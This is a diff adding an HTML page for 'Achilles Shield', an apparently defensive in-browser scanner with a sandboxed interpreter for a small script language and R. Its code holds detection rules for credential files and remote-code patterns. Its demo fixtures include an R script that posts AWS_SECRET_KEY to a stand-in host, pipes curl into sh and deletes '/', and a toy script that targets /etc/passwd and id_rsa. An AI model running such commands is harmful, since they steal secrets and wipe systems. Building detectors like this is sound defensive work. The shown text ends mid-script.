@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ACHILLES SHIELD // Cybersecurity Toolkit</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;600;700&family=JetBrains+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bronze-black:#14110d;
+    --panel:#1c1810;
+    --panel-alt:#221c13;
+    --panel-raised:#292014;
+    --bronze:#b8793e;
+    --bronze-bright:#e0a85f;
+    --patina:#6f8f7c;
+    --bone:#e8dfc8;
+    --bone-dim:#a89b7c;
+    --terracotta:#c1450e;
+    --amber:#c98a2c;
+    --olive:#93923f;
+    --safe:#5f8f6a;
+    --border:#3a2f1e;
+    --shadow: 0 8px 28px rgba(0,0,0,0.55);
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+  body{
+    background:
+      radial-gradient(ellipse at top, #1d1710 0%, var(--bronze-black) 55%),
+      var(--bronze-black);
+    color:var(--bone);
+    font-family:'IBM Plex Sans', sans-serif;
+    min-height:100vh;
+    padding:0 0 60px;
+  }
+  ::selection{ background:var(--bronze); color:#14110d; }
+
+  /* ---------- meander border ---------- */
+  .meander{ width:100%; height:14px; display:block; opacity:0.85; }
+  .meander.flip{ transform:scaleY(-1); }
+
+  /* ---------- header ---------- */
+  header{
+    max-width:1180px; margin:0 auto; padding:38px 24px 22px;
+    text-align:center;
+  }
+  .eyebrow{
+    font-family:'JetBrains Mono', monospace;
+    letter-spacing:0.35em;
+    font-size:11px;
+    color:var(--patina);
+    text-transform:uppercase;
+    margin-bottom:10px;
+  }
+  h1{
+    font-family:'Cinzel', serif;
+    font-weight:700;
+    font-size:clamp(32px, 5vw, 54px);
+    letter-spacing:0.06em;
+    margin:0;
+    background:linear-gradient(180deg, var(--bronze-bright) 0%, var(--bronze) 55%, #8a5a29 100%);
+    -webkit-background-clip:text;
+    background-clip:text;
+    color:transparent;
+    text-shadow: 0 2px 18px rgba(184,121,62,0.25);
+  }
+  .subtitle{
+    margin-top:10px;
+    color:var(--bone-dim);
+    font-size:14.5px;
+    max-width:640px;
+    margin-left:auto; margin-right:auto;
+    line-height:1.6;
+  }
+  .subtitle b{ color:var(--bone); font-weight:600; }
+
+  /* ---------- layout ---------- */
+  .workspace{
+    max-width:1180px; margin:26px auto 0; padding:0 24px;
+    display:grid; grid-template-columns: 1fr 1.15fr; gap:20px;
+  }
+  @media (max-width: 900px){ .workspace{ grid-template-columns:1fr; } }
+
+  .panel{
+    background:linear-gradient(180deg, var(--panel-alt), var(--panel));
+    border:1px solid var(--border);
+    border-radius:10px;
+    box-shadow:var(--shadow);
+    overflow:hidden;
+    display:flex; flex-direction:column;
+  }
+  .panel-head{
+    display:flex; align-items:center; justify-content:space-between;
+    padding:14px 16px;
+    border-bottom:1px solid var(--border);
+    background:rgba(0,0,0,0.18);
+  }
+  .panel-title{
+    font-family:'Cinzel', serif;
+    font-weight:600;
+    letter-spacing:0.08em;
+    font-size:13.5px;
+    color:var(--bronze-bright);
+    text-transform:uppercase;
+  }
+  .panel-body{ padding:16px; display:flex; flex-direction:column; gap:12px; flex:1; }
+
+  /* ---------- controls ---------- */
+  select, .btn, .file-btn, input[type=text]{
+    font-family:'IBM Plex Sans', sans-serif;
+    font-size:12.5px;
+    border-radius:6px;
+    border:1px solid var(--border);
+    background:var(--panel-raised);
+    color:var(--bone);
+    padding:7px 11px;
+    cursor:pointer;
+    transition:all .15s ease;
+  }
+  input[type=text]{ cursor:text; font-family:'JetBrains Mono', monospace; font-size:12px; }
+  input[type=text]:focus{ outline:none; border-color:var(--bronze); }
+  input[type=text]::placeholder{ color:#5b4f38; }
+  select:hover, .btn:hover, .file-btn:hover{ border-color:var(--bronze); color:var(--bronze-bright); }
+  .btn.primary{
+    background:linear-gradient(180deg, var(--bronze-bright), var(--bronze));
+    color:#1a1408; font-weight:600; border:none;
+  }
+  .btn.primary:hover{ filter:brightness(1.08); color:#1a1408; }
+  .btn.danger{ border-color:var(--terracotta); color:var(--terracotta); }
+  .btn.danger:hover{ background:rgba(193,69,14,0.12); color:var(--terracotta); }
+  .btn:disabled{ opacity:0.4; cursor:not-allowed; }
+  .row{ display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
+  .grow{ flex:1; }
+  input[type=file]{ display:none; }
+  label.check{
+    font-size:12px; color:var(--bone-dim); display:flex; align-items:center; gap:6px;
+    font-family:'JetBrains Mono', monospace;
+  }
+
+  /* ---------- editor ---------- */
+  .editor-wrap{
+    display:flex; background:#0f0c08; border:1px solid var(--border); border-radius:8px;
+    overflow:hidden; flex:1; min-height:320px;
+  }
+  .gutter{
+    font-family:'JetBrains Mono', monospace; font-size:12.5px; line-height:20px;
+    color:#5b4f38; background:#0c0a06; padding:12px 8px; text-align:right;
+    user-select:none; white-space:pre; overflow:hidden;
+  }
+  textarea#editor{
+    flex:1; resize:none; border:none; outline:none;
+    background:transparent; color:var(--bone);
+    font-family:'JetBrains Mono', monospace; font-size:12.5px; line-height:20px;
+    padding:12px; white-space:pre; overflow:auto;
+  }
+
+  /* ---------- tabs ---------- */
+  .tabs{ display:flex; gap:2px; padding:0 16px; border-bottom:1px solid var(--border); background:rgba(0,0,0,0.18); }
+  .tab{
+    font-family:'JetBrains Mono', monospace; font-size:11.5px; letter-spacing:0.06em;
+    text-transform:uppercase; color:var(--bone-dim); padding:11px 14px; cursor:pointer;
+    border-bottom:2px solid transparent;
+  }
+  .tab.active{ color:var(--bronze-bright); border-bottom-color:var(--bronze); }
+  .tab-content{ display:none; padding:16px; flex:1; overflow:auto; }
+  .tab-content.active{ display:flex; flex-direction:column; gap:12px; }
+
+  /* ---------- risk badge ---------- */
+  .risk-row{ display:flex; align-items:center; gap:14px; flex-wrap:wrap; }
+  .risk-badge{
+    font-family:'Cinzel', serif; font-weight:700; letter-spacing:0.05em;
+    padding:8px 16px; border-radius:8px; font-size:14px;
+    border:1px solid var(--border);
+  }
+  .risk-INFO{ color:var(--patina); border-color:var(--patina); }
+  .risk-LOW{ color:var(--safe); border-color:var(--safe); }
+  .risk-MEDIUM{ color:var(--olive); border-color:var(--olive); }
+  .risk-HIGH{ color:var(--amber); border-color:var(--amber); }
+  .risk-CRITICAL{ color:var(--terracotta); border-color:var(--terracotta); background:rgba(193,69,14,0.08); }
+
+  .count-chip{
+    font-family:'JetBrains Mono', monospace; font-size:11.5px;
+    padding:4px 9px; border-radius:20px; border:1px solid var(--border); color:var(--bone-dim);
+  }
+
+  /* ---------- findings list ---------- */
+  .findings{ display:flex; flex-direction:column; gap:8px; }
+  .finding{
+    border:1px solid var(--border); border-left-width:3px; border-radius:6px;
+    padding:9px 12px; background:rgba(0,0,0,0.15);
+  }
+  .finding.sev-CRITICAL{ border-left-color:var(--terracotta); }
+  .finding.sev-HIGH{ border-left-color:var(--amber); }
+  .finding.sev-MEDIUM{ border-left-color:var(--olive); }
+  .finding.sev-LOW{ border-left-color:var(--safe); }
+  .finding.sev-INFO{ border-left-color:var(--patina); }
+  .finding-top{ display:flex; justify-content:space-between; gap:10px; font-family:'JetBrains Mono', monospace; font-size:11px; color:var(--bone-dim); }
+  .finding-line{ font-family:'JetBrains Mono', monospace; font-size:12px; margin-top:5px; color:var(--bone); word-break:break-all; }
+  .finding-reason{ font-size:12px; color:var(--bone-dim); margin-top:4px; line-height:1.5; }
+  .empty-note{ color:var(--bone-dim); font-size:13px; font-style:italic; }
+
+  /* ---------- console ---------- */
+  #console{
+    background:#0c0a06; border:1px solid var(--border); border-radius:8px;
+    font-family:'JetBrains Mono', monospace; font-size:12.5px; line-height:1.65;
+    padding:12px; min-height:220px; max-height:340px; overflow:auto; white-space:pre-wrap;
+  }
+  #console .line-out{ color:var(--bone); }
+  #console .line-block{ color:var(--terracotta); }
+  #console .line-sys{ color:var(--patina); }
+  .fs-tree{ display:flex; flex-direction:column; gap:6px; }
+  .fs-file{
+    font-family:'JetBrains Mono', monospace; font-size:12px; border:1px solid var(--border);
+    border-radius:6px; padding:7px 10px; background:rgba(0,0,0,0.15); cursor:pointer;
+  }
+  .fs-file:hover{ border-color:var(--bronze); }
+  .fs-file-name{ color:var(--bronze-bright); }
+  .fs-preview{ display:none; margin-top:6px; color:var(--bone-dim); white-space:pre-wrap; border-top:1px dashed var(--border); padding-top:6px; }
+  .fs-file.open .fs-preview{ display:block; }
+
+  footer{
+    max-width:1180px; margin:26px auto 0; padding:0 24px;
+    text-align:center; color:var(--bone-dim); font-size:11.5px; font-family:'JetBrains Mono', monospace;
+    letter-spacing:0.03em;
+  }
+</style>
+</head>
+<body>
+
+<svg class="meander" viewBox="0 0 400 14" preserveAspectRatio="none">
+  <defs>
+    <pattern id="key1" width="28" height="14" patternUnits="userSpaceOnUse">
+      <path d="M0,12 H8 V4 H20 V12 H28 M20,4 V0 M8,12 V14" fill="none" stroke="#5c4326" stroke-width="1.6"/>
+    </pattern>
+  </defs>
+  <rect width="400" height="14" fill="url(#key1)"/>
+</svg>
+
+<header>
+  <div class="eyebrow">ΑΣΠΙΣ ΑΧΙΛΛΕΩΣ &nbsp;·&nbsp; DEFENSE IN DEPTH</div>
+  <h1>ACHILLES SHIELD</h1>
+  <p class="subtitle">
+    An in-browser <b>cybersecurity toolkit</b> for scanning scripts —
+    forge or fetch a script, run it through the <b>static scanner</b>, and, for
+    Achilles Shield scripts, execute it inside a fully <b>sandboxed interpreter</b>
+    with no access to your real filesystem. Nothing here ever leaves this page.
+  </p>
+</header>
+
+<main class="workspace">
+
+  <!-- ============ EDITOR PANEL ============ -->
+  <section class="panel">
+    <div class="panel-head">
+      <span class="panel-title">Script Forge</span>
+      <select id="languageSelect" style="font-size:11px; padding:4px 8px;">
+        <option value="ashield">Achilles Shield</option>
+        <option value="r">R</option>
+      </select>
+    </div>
+    <div class="panel-body">
+      <div class="row">
+        <select id="exampleSelect" class="grow">
+          <option value="">— load an example —</option>
+          <option value="benign">Clean script (survey log)</option>
+          <option value="malicious">Risky script (traversal + DoS demo)</option>
+        </select>
+        <label class="file-btn" for="fileInput">Upload file</label>
+        <input type="file" id="fileInput" accept=".Achilles_shield,.txt">
+        <button class="btn" id="clearBtn">Clear</button>
+      </div>
+
+      <div class="row">
+        <input type="text" id="urlInput" class="grow" placeholder="https://raw.githubusercontent.com/.../script.R">
+        <button class="btn" id="fetchUrlBtn">Fetch script</button>
+      </div>
+      <div id="fetchStatus" style="font-size:11px; color:var(--bone-dim); font-family:'JetBrains Mono',monospace; min-height:14px;"></div>
+
+      <div class="editor-wrap">
+        <div class="gutter" id="gutter">1</div>
+        <textarea id="editor" spellcheck="false" placeholder="greet Aeryn
+add 1 2 3
+write notes.txt hello moon
+loop 3 echo vamos!!"></textarea>
+      </div>
+
+      <div class="row">
+        <button class="btn primary grow" id="scanBtn">Run Static Scan</button>
+      </div>
+      <div class="row">
+        <button class="btn grow" id="runBtn">Run in Sandbox</button>
+        <label class="check"><input type="checkbox" id="allowCritical"> allow CRITICAL</label>
+      </div>
+      <div class="row">
+        <button class="btn" id="downloadReportBtn" disabled>Download JSON report</button>
+        <span class="grow"></span>
+        <span id="lastRunNote" style="font-size:11px; color:var(--bone-dim); font-family:'JetBrains Mono',monospace;"></span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ RESULTS PANEL ============ -->
+  <section class="panel">
+    <div class="tabs">
+      <div class="tab active" data-tab="scan">Scan Findings</div>
+      <div class="tab" data-tab="sandbox">Sandbox Console</div>
+    </div>
+
+    <div class="tab-content active" id="tab-scan">
+      <div class="risk-row">
+        <span style="font-size:11px; color:var(--bone-dim); font-family:'JetBrains Mono',monospace; text-transform:uppercase;">Overall risk</span>
+        <span id="overallBadge" class="risk-badge risk-INFO">— run a scan —</span>
+        <span class="grow"></span>
+        <span id="chipINFO" class="count-chip">INFO 0</span>
+        <span id="chipLOW" class="count-chip">LOW 0</span>
+        <span id="chipMEDIUM" class="count-chip">MEDIUM 0</span>
+        <span id="chipHIGH" class="count-chip">HIGH 0</span>
+        <span id="chipCRITICAL" class="count-chip">CRITICAL 0</span>
+      </div>
+      <div class="findings" id="findingsList">
+        <div class="empty-note">No scan run yet. Click "Run Static Scan" on the left.</div>
+      </div>
+    </div>
+
+    <div class="tab-content" id="tab-sandbox">
+      <div id="console"><span class="line-sys">// sandboxed interpreter output will appear here — this virtual machine has no access to your real device</span></div>
+      <div class="row">
+        <span class="panel-title" style="font-size:11.5px;">Virtual Filesystem</span>
+        <span class="grow"></span>
+        <button class="btn" id="resetSandboxBtn">Reset sandbox</button>
+      </div>
+      <div class="fs-tree" id="fsTree"><div class="empty-note">Sandbox filesystem is empty.</div></div>
+    </div>
+  </section>
+
+</main>
+
+<footer>forged in-browser · static scan + sandbox never transmit script contents anywhere</footer>
+
+<svg class="meander flip" viewBox="0 0 400 14" preserveAspectRatio="none">
+  <rect width="400" height="14" fill="url(#key1)"/>
+</svg>
+
+<script>
+/* =========================================================================
+   ACHILLES SHIELD — STATIC SCANNER
+   Ported from the reference achilles_shield.py interpreter's command set.
+   ========================================================================= */
+const KNOWN_COMMANDS = new Set(["loop","greet","add","multiply","analyze","read","write","random","echo","help","exit"]);
+const SEVERITY_ORDER = ["INFO","LOW","MEDIUM","HIGH","CRITICAL"];
+const SEVERITY_RANK = Object.fromEntries(SEVERITY_ORDER.map((s,i)=>[s,i]));
+
+const SENSITIVE_PATH_HINTS = [
+  "..","~","/etc","/root","/boot","/var/log","/proc","/sys",
+  ".ssh","id_rsa","authorized_keys","known_hosts",
+  ".aws",".gnupg","credentials","passwd","shadow",
+  ".bash_history",".bashrc",".zshrc",".env",
+  "c:\\windows","system32","sam","ntds.dit"
+];
+const CRITICAL_HINTS = new Set(["..","/etc","/root","id_rsa","shadow","passwd"]);
+const EXECUTABLE_EXT = new Set([".py",".sh",".bash",".bat",".cmd",".ps1",".exe",".dll",".so",".service",".desktop",".vbs",".js"]);
+const MAX_SAFE_LOOP = 10000;
+const MAX_LINE_ARGS = 200;
+
+function extOf(path){
+  const i = path.lastIndexOf(".");
+  return i === -1 ? "" : path.slice(i).toLowerCase();
+}
+
+function checkPath(findings, lineNo, rawLine, command, path){
+  const lowered = path.toLowerCase();
+  for(const hint of SENSITIVE_PATH_HINTS){
+    if(lowered.includes(hint)){
+      const sev = CRITICAL_HINTS.has(hint) ? "CRITICAL" : "HIGH";
+      findings.push({line_no:lineNo, line:rawLine, command, severity:sev,
+        reason:`Path '${path}' touches a sensitive location or uses traversal (matched '${hint}')`});
+      return;
+    }
+  }
+  const ext = extOf(lowered);
+  if(EXECUTABLE_EXT.has(ext)){
+    findings.push({line_no:lineNo, line:rawLine, command, severity:"HIGH",
+      reason:`References an executable/script file type '${ext}' — possible persistence or code-drop attempt`});
+  }
+  if(path.startsWith("/") || /^[a-zA-Z]:\\/.test(path)){
+    findings.push({line_no:lineNo, line:rawLine, command, severity:"MEDIUM",
+      reason:`Absolute path '${path}' used — script is not confined to a working directory`});
+  }
+}
+
+function checkLoop(findings, lineNo, rawLine, args){
+  if(args.length < 2){
+    findings.push({line_no:lineNo, line:rawLine, command:"loop", severity:"LOW",
+      reason:"Malformed loop statement (missing count/command)"});
+    return;
+  }
+  const count = parseInt(args[0], 10);
+  const innerCmd = args[1].toLowerCase();
+  if(isNaN(count) || String(count) !== args[0].replace(/^\+/, "")){
+    findings.push({line_no:lineNo, line:rawLine, command:"loop", severity:"LOW", reason:"Loop count is not an integer"});
+    return;
+  }
+  if(count > MAX_SAFE_LOOP){
+    findings.push({line_no:lineNo, line:rawLine, command:"loop", severity:"HIGH",
+      reason:`Loop count ${count} exceeds safe threshold (${MAX_SAFE_LOOP}) — possible DoS / resource exhaustion`});
+  } else if(count > 1000){
+    findings.push({line_no:lineNo, line:rawLine, command:"loop", severity:"MEDIUM",
+      reason:`Loop count ${count} is unusually high`});
+  }
+  if((innerCmd === "write" || innerCmd === "read") && count > 100){
+    findings.push({line_no:lineNo, line:rawLine, command:"loop", severity:"HIGH",
+      reason:`Loop repeats '${innerCmd}' ${count} times — amplified file I/O risk (disk exhaustion / repeated exfiltration attempts)`});
+  }
+  if(!KNOWN_COMMANDS.has(innerCmd)){
+    findings.push({line_no:lineNo, line:rawLine, command:"loop", severity:"LOW",
+      reason:`Loop targets unknown command '${innerCmd}'`});
+  }
+}
+
+function scanScript(text){
+  const findings = [];
+  const lines = text.split("\n");
+  lines.forEach((raw, idx) => {
+    const lineNo = idx + 1;
+    const stripped = raw.trim();
+    if(!stripped || stripped.startsWith("#")) return;
+    const parts = stripped.split(/\s+/);
+    const command = parts[0].toLowerCase();
+    const args = parts.slice(1);
+
+    if(args.length > MAX_LINE_ARGS){
+      findings.push({line_no:lineNo, line:raw, command, severity:"MEDIUM",
+        reason:`Unusually high argument count (${args.length}) — possible buffer/resource abuse`});
+    }
+    if(!KNOWN_COMMANDS.has(command)){
+      findings.push({line_no:lineNo, line:raw, command, severity:"LOW",
+        reason:`Unknown command '${command}' — will be rejected at runtime, but may indicate a typo, leftover debug command, or probing for hidden functionality`});
+      return;
+    }
+    if(command === "write"){
+      if(args.length === 0){
+        findings.push({line_no:lineNo, line:raw, command, severity:"LOW", reason:"write with no filename specified"});
+      } else {
+        checkPath(findings, lineNo, raw, command, args[0]);
+        const payload = args.slice(1).join(" ");
+        if(payload.length > 5000){
+          findings.push({line_no:lineNo, line:raw, command, severity:"MEDIUM", reason:`Very large payload written (${payload.length} chars)`});
+        }
+      }
+    } else if(command === "read"){
+      if(args.length === 0){
+        findings.push({line_no:lineNo, line:raw, command, severity:"LOW", reason:"read with no filename specified"});
+      } else {
+        checkPath(findings, lineNo, raw, command, args[0]);
+      }
+    } else if(command === "loop"){
+      checkLoop(findings, lineNo, raw, args);
+    } else if(command === "exit"){
+      findings.push({line_no:lineNo, line:raw, command, severity:"INFO",
+        reason:"Script terminates the REPL — any lines after this are unreachable"});
+    }
+  });
+  return findings;
+}
+
+function overallSeverity(findings){
+  if(findings.length === 0) return "INFO";
+  return findings.reduce((max,f) => SEVERITY_RANK[f.severity] > SEVERITY_RANK[max] ? f.severity : max, "INFO");
+}
+
+/* =========================================================================
+   R — STATIC SCANNER
+   R is a real general-purpose language, so the risk surface is different
+   from the Achilles Shield DSL: arbitrary command execution, dynamic code
+   evaluation, remote code loading, destructive filesystem calls, and
+   credential handling. There is no R runtime in a browser, so R scripts
+   get static analysis only (no sandboxed execution).
+   ========================================================================= */
+const R_SIMPLE_RULES = [
+  { name:"system()", re:/\bsystem2?\s*\(/, severity:"CRITICAL",
+    reason:"system()/system2() executes an arbitrary OS shell command from R" },
+  { name:"shell()", re:/\bshell(\.exec)?\s*\(/, severity:"CRITICAL",
+    reason:"shell()/shell.exec() executes an arbitrary OS command" },
+  { name:"eval(parse())", re:/\beval\s*\(\s*parse\s*\(/, severity:"CRITICAL",
+    reason:"eval(parse(...)) dynamically builds and executes code at runtime — a classic injection/obfuscation pattern" },
+  { name:"source(url)", re:/\bsource\s*\(\s*(url\s*\(|["'`]https?:\/\/)/i, severity:"CRITICAL",
+    reason:"source() loads and immediately executes code fetched from a remote URL" },
+  { name:"download.file()", re:/\bdownload\.file\s*\(/, severity:"HIGH",
+    reason:"download.file() retrieves a remote payload to local disk" },
+  { name:"remote connection", re:/\b(RCurl::getURL|curl::curl|httr::GET|httr::POST)\s*\(\s*["'`]https?:\/\//, severity:"MEDIUM",
+    reason:"opens a network connection to a remote URL" },
+  { name:"unlink(recursive)", re:/\bunlink\s*\([^)]*recursive\s*=\s*TRUE/i, severity:"HIGH",
+    reason:"recursive unlink() can destructively delete entire directory trees" },
+  { name:"unlink(root)", re:/\bunlink\s*\(\s*["'`]\/["'`]/, severity:"CRITICAL",
+    reason:"attempts to unlink the root filesystem path" },
+  { name:"file.remove()", re:/\bfile\.remove\s*\(/, severity:"MEDIUM",
+    reason:"file.remove() deletes files from disk" },
+  { name:"install.packages(url)", re:/\binstall\.packages\s*\([^)]*repos\s*=\s*["'`]https?:\/\/(?!cran)/i, severity:"MEDIUM",
+    reason:"installs packages from a non-CRAN repository URL" },
+  { name:".Internal/.Primitive", re:/\.(Internal|Primitive)\s*\(/, severity:"MEDIUM",
+    reason:"calls low-level .Internal/.Primitive functions — unusual outside base R internals" },
+  { name:"options(warn=-1)", re:/\boptions\s*\(\s*warn\s*=\s*-1\s*\)/, severity:"LOW",
+    reason:"suppresses warnings, which can hide errors or unwanted side effects" },
+];
+const R_FILE_FUNCS = /\b(read\.csv2?|read\.table|write\.csv2?|write\.table|writeLines|readLines|saveRDS|readRDS|load|scan|file\.copy|file\.remove|unlink)\s*\(/;
+
+function scanRScript(text){
+  const findings = [];
+  const lines = text.split("\n");
+  lines.forEach((raw, idx) => {
+    const lineNo = idx + 1;
+    const stripped = raw.trim();
+    if(!stripped || stripped.startsWith("#")) return;
+
+    R_SIMPLE_RULES.forEach(rule => {
+      if(rule.re.test(stripped)){
+        findings.push({line_no:lineNo, line:raw, command:rule.name, severity:rule.severity, reason:rule.reason});
+      }
+    });
+
+    if(/\bSys\.(setenv|getenv)\s*\(/i.test(stripped) && /(token|key|secret|password|passwd|api_key)/i.test(stripped)){
+      findings.push({line_no:lineNo, line:raw, command:"Sys credential", severity:"HIGH",
+        reason:"handles what looks like a credential or secret via environment variables"});
+    }
+
+    if(/\bbase64(decode|Decode)\s*\(/.test(stripped)){
+      const combinedWithEval = /\beval\s*\(/.test(stripped) || /\bparse\s*\(/.test(stripped);
+      findings.push({line_no:lineNo, line:raw, command:"base64decode",
+        severity: combinedWithEval ? "CRITICAL" : "HIGH",
+        reason: combinedWithEval
+          ? "Decodes base64 content and evaluates it — classic obfuscated payload execution pattern"
+          : "Decodes base64 content, often used to obfuscate payloads or data" });
+    }
+
+    if(/\bhttr::(POST|PUT|GET)\s*\(/.test(stripped) && /Sys\.getenv/i.test(stripped)){
+      findings.push({line_no:lineNo, line:raw, command:"httr request", severity:"HIGH",
+        reason:"Sends an HTTP request that includes what looks like an environment-derived value — possible credential exfiltration"});
+    }
+
+    const fileFuncMatch = stripped.match(R_FILE_FUNCS);
+    if(fileFuncMatch){
+      const literals = [...stripped.matchAll(/["'`]([^"'`]+)["'`]/g)].map(m => m[1]);
+      literals.forEach(lit => checkPath(findings, lineNo, raw, fileFuncMatch[1], lit));
+    }
+  });
+  return findings;
+}
+
+/* =========================================================================
+   SANDBOXED INTERPRETER — pure in-memory virtual machine, no real I/O ever
+   ========================================================================= */
+let virtualFS = {};
+function normalizeSandboxPath(path){
+  // Anything resembling traversal or absolute paths is flattened to a bare
+  // filename inside the sandbox root — mirrors how the desktop-tool sandbox
+  // blocks path escapes, but here there is no real filesystem to escape to.
+  let name = path.replace(/^([a-zA-Z]:)?[\\/]+/, "").replace(/\.\.[\\/]?/g, "");
+  name = name.split(/[\\/]/).pop() || "unnamed_file";
+  return name;
+}
+
+function makeSandbox(consoleEl){
+  const MAX_LOOP = MAX_SAFE_LOOP;
+  const out = (text, cls="line-out") => {
+    const span = document.createElement("div");
+    span.className = cls;
+    span.textContent = text;
+    consoleEl.appendChild(span);
+  };
+  const commands = {
+    greet: (...a) => out(`Hello, ${a[0] || "Hero"}! Welcome to Achilles Shield (sandboxed).`),
+    add: (...a) => {
+      const nums = a.map(Number);
+      if(nums.some(isNaN)) return out("Error: all arguments must be numbers.");
+      out("Sum: " + nums.reduce((x,y)=>x+y,0));
+    },
+    multiply: (...a) => {
+      const nums = a.map(Number);
+      if(nums.some(isNaN)) return out("Error: all arguments must be numbers.");
+      out("Product: " + nums.reduce((x,y)=>x*y,1));
+    },
+    analyze: (...a) => {
+      const text = a.join(" ");
+      out(`Text Analysis -> Words: ${text.split(/\s+/).filter(Boolean).length}, Characters: ${text.length}`);
+    },
+    read: (...a) => {
+      if(a.length === 0) return out("Error: specify a file name");
+      const name = normalizeSandboxPath(a[0]);
+      if(name !== a[0]) out(`[BLOCKED] path traversal/absolute path normalized to sandbox file '${name}'`, "line-block");
+      if(!(name in virtualFS)) return out(`File not found: ${name}`);
+      out(`--- Contents of ${name} ---\n${virtualFS[name]}`);
+    },
+    write: (...a) => {
+      if(a.length < 2) return out("Error: specify a file name and text");
+      const name = normalizeSandboxPath(a[0]);
+      if(name !== a[0]) out(`[BLOCKED] path traversal/absolute path normalized to sandbox file '${name}'`, "line-block");
+      virtualFS[name] = a.slice(1).join(" ");
+      out(`Written to ${name} (sandboxed, in-memory only)`);
+      renderFsTree();
+    },
+    random: (...a) => {
+      if(a.length === 2){
+        const lo = parseInt(a[0],10), hi = parseInt(a[1],10);
+        if(isNaN(lo) || isNaN(hi)) return out("Error: provide two integer numbers");
+        out("Random Number: " + (Math.floor(Math.random()*(hi-lo+1))+lo));
+      } else {
+        out("Random Number: " + Math.random());
+      }
+    },
+    echo: (...a) => out(a.join(" ")),
+    loop: (...a) => {
+      if(a.length < 2) return out("Error: usage loop N command args...");
+      const count = parseInt(a[0], 10);
+      if(isNaN(count)) return out("Error: loop count must be an integer");
+      if(count > MAX_LOOP) return out(`[BLOCKED] loop count ${count} exceeds sandbox cap of ${MAX_LOOP}`, "line-block");
+      const cmd = a[1].toLowerCase();
+      if(!(cmd in commands) || cmd === "loop") return out(`[BLOCKED] loop cannot target '${cmd}'`, "line-block");
+      for(let i=0;i<count;i++) commands[cmd](...a.slice(2));
+    },
+    help: () => out("Sandboxed commands: " + Object.keys(commands).join(", ")),
+    exit: () => { out("Exiting sandboxed run.", "line-sys"); throw {__exit:true}; }
+  };
+  return { commands, out };
+}
+
+function runSandbox(text, consoleEl){
+  consoleEl.innerHTML = "";
+  const { commands, out } = makeSandbox(consoleEl);
+  const lines = text.split("\n");
+  try{
+    for(const raw of lines){
+      const stripped = raw.trim();
+      if(!stripped || stripped.startsWith("#")) continue;
+      const parts = stripped.split(/\s+/);
+      const cmd = parts[0].toLowerCase();
+      const args = parts.slice(1);
+      if(cmd in commands) commands[cmd](...args);
+      else out(`Unknown command: ${cmd}`, "line-block");
+    }
+  } catch(e){
+    if(!e || !e.__exit) throw e;
+  }
+}
+
+/* =========================================================================
+   UI WIRING
+   ========================================================================= */
+const editor = document.getElementById("editor");
+const gutter = document.getElementById("gutter");
+const consoleEl = document.getElementById("console");
+const fsTreeEl = document.getElementById("fsTree");
+
+const EXAMPLES_ASHIELD = {
+  benign: `# routine survey log
+greet Aeryn
+add 12 30
+write field_notes.txt Lunar survey grid seven marked complete
+loop 4 echo vamos!!
+help`,
+  malicious: `# suspicious script — demonstrates scanner detection
+greet Grawandor
+write ../../etc/passwd hacked
+read ~/.ssh/id_rsa
+loop 50000 write payload.py evil_code
+foo bar baz
+loop 5 greet Aeryn
+exit`
+};
+
+const EXAMPLES_R = {
+  benign: `# routine data cleanup
+df <- read.csv("sales_q1.csv")
+summary(df)
+write.csv(df, "sales_q1_clean.csv")
+cat("Report ready\\n")`,
+  malicious: `# suspicious script — demonstrates scanner detection
+key <- Sys.getenv("AWS_SECRET_KEY")
+httr::POST("http://example-collector.com/upload", body = list(k = key))
+source(url("http://example-collector.com/payload.R"))
+system("curl http://example-collector.com/x | sh")
+unlink("/", recursive = TRUE)
+eval(parse(text = base64decode("cm0gLXJmIC8=")))`
+};
+
+const EXAMPLE_LABELS = {
+  ashield: [["", "— load an example —"], ["benign", "Clean script (survey log)"], ["malicious", "Risky script (traversal + DoS demo)"]],
+  r:       [["", "— load an example —"], ["benign", "Clean script (data cleanup)"], ["malicious", "Risky script (exfil + RCE demo)"]]
+};
+
+const PLACEHOLDERS = {
+  ashield: "greet Aeryn\nadd 1 2 3\nwrite notes.txt hello moon\nloop 3 echo vamos!!",
+  r: 'df <- read.csv("data.csv")\nsummary(df)\ncat("done\\n")'
+};
+
+function currentLang(){ return document.getElementById("languageSelect").value; }
+function currentExamples(){ return currentLang() === "r" ? EXAMPLES_R : EXAMPLES_ASHIELD; }
+
+function refreshExampleOptions(lang){
+  const sel = document.getElementById("exampleSelect");
+  sel.innerHTML = EXAMPLE_LABELS[lang].map(([v,l]) => `<option value="${v}">${l}</option>`).join("");
+}
+
+function syncGutter(){
+  const lineCount = editor.value.split("\n").length;
+  let s = "";
+  for(let i=1;i<=lineCount;i++) s += i + "\n";
+  gutter.textContent = s;
+  gutter.scrollTop = editor.scrollTop;
+}
+editor.addEventListener("input", syncGutter);
+editor.addEventListener("scroll", () => gutter.scrollTop = editor.scrollTop);
+syncGutter();
+
+document.getElementById("languageSelect").addEventListener("change", (e) => {
+  const lang = e.target.value;
+  refreshExampleOptions(lang);
+  editor.placeholder = PLACEHOLDERS[lang];
+  document.getElementById("fileInput").setAttribute("accept", lang === "r" ? ".R,.r,.txt" : ".Achilles_shield,.txt");
+  const runBtn = document.getElementById("runBtn");
+  if(lang === "r"){
+    runBtn.disabled = true;
+    runBtn.title = "R has no in-browser runtime — static analysis only. Use Run Static Scan.";
+  } else {
+    runBtn.disabled = false;
+    runBtn.title = "";
+  }
+  document.getElementById("overallBadge").textContent = "— run a scan —";
+  document.getElementById("overallBadge").className = "risk-badge risk-INFO";
+  document.getElementById("findingsList").innerHTML = `<div class="empty-note">No scan run yet. Click "Run Static Scan" on the left.</div>`;
+  SEVERITY_ORDER.forEach(s => document.getElementById("chip"+s).textContent = `${s} 0`);
+});
+refreshExampleOptions("ashield");
+
+document.getElementById("exampleSelect").addEventListener("change", (e) => {
+  const set = currentExamples();
+  if(set[e.target.value]){ editor.value = set[e.target.value]; syncGutter(); }
+});
+document.getElementById("clearBtn").addEventListener("click", () => { editor.value = ""; syncGutter(); editor.focus(); });
